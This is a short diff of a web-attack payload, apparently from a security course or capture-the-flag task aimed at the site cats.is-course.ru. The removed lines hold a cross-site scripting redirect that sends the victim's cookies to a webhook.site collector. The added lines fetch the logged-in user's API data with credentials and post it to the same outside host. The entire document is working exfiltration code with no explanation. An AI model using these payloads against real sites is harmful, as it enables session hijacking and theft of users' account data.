@@ -1,3 +1,4 @@
-<script>
-  location.href = 'https://cats.is-course.ru/feedback?message=<script>fetch("https://webhook.site/...?c="+document.cookie)</script>';
-</script>
+fetch('https://cats.is-course.ru/api/user', { credentials: 'include' })
+  .then(r => r.text())
+  .then(t => fetch('https://webhook.site/...', { method: 'POST', mode: 'no-cors', body: t }))
+  .catch(e => fetch('https://webhook.site/...', { method: 'POST', mode: 'no-cors', body: 'ERR: ' + e.message }));
